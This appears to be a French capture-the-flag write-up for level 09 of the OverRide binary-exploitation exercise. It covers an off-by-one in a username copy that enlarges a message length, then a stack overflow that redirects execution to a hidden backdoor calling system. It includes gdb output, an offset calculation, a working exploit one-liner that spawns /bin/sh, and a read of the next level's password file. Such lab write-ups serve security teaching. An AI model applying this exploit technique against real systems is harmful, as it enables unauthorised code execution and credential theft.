# Level 09

Pour ce niveau on se retrouve avec un executable qui demande un username puis un message a envoyer

En lisant le code source on peut voir une fonction jamais utilise `secret_backdoor` appelant la fonction `system` avec un argument qui recupere dans l'entree standard

```bash
(gdb) p secret_backdoor 
$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
(gdb)
```

Pour pouvoir provoquer un overflow nous devons faire en sorte de modifier la taille de notre message qui se retrouve initialiser a `140` de base grace a l'exploitation de la condition qui se trouve dans la boucle qui copie `41 octets` au lieu de `40 octets` pour l'username comme defini dans la structure nous permettant d'ecrire sur un octet et ainsi changer la taille du message

```c
for (int i = 0; i <= 40 && name[i]; ++i)
	m->username[i] = name[i];
```

Trouvons maintenant l'offset necessaire pour atteindre l'`EIP` dans la fonction `handle_msg`

```bash
(gdb) disas handle_msg 
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:	push   rbp
   0x00005555555548c1 <+1>:	mov    rbp,rsp
   0x00005555555548c4 <+4>:	sub    rsp,0xc0
   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
=> 0x00005555555548d2 <+18>:	add    rax,0x8c
   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
   0x000055555555490d <+77>:	mov    rdi,rax
   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
   0x000055555555491c <+92>:	mov    rdi,rax
   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
   0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
   0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:	leave  
   0x0000555555554931 <+113>:	ret    
End of assembler dump.
(gdb) i f
Stack level 0, frame at 0x7fffffffe5e0:
 rip = 0x5555555548d2 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5f0
 Arglist at 0x7fffffffe5d0, args: 
 Locals at 0x7fffffffe5d0, Previous frame's sp is 0x7fffffffe5e0
 Saved registers:
  rbp at 0x7fffffffe5d0, rip at 0x7fffffffe5d8
(gdb) x/x $rax
0x7fffffffe510:	0x0000000a
(gdb) p/d 0x7fffffffe5d8 - 0x7fffffffe510
$2 = 200
```

```bash
(gdb) run < <(python -c 'print "A"*40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level09/level09 < <(python -c 'print "A"*40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A"')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) x/x $rsp
0x7fffffffe5d8:	0x4138674137674136
(gdb) 
```

Du coup notre payload ressemble a:

```bash
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]'; python -c 'print "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
****************************************
```